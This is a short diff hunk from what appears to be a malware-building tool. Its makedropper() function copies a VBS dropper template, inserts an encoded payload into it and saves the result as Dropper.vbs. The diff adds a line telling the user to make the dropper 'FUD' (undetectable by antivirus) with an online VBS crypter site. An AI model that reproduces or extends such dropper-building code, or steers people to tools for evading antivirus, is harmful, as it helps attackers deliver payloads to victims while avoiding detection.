@@ -24,6 +24,7 @@ def makedropper():
             os.system("cp -r template/Dropper.vbs  payloads/")
             inplace_change('payloads/Dropper.vbs', '#ENCODEDPAYLOAD', datapar)
             print("Saved As Dropper.vbs in /payloads")
+            print("to Make it FUD Use This(https://hackfree.org/VbsCrypter/)")
     else:
         print("[-] I can t Find your Payload")
         exit()
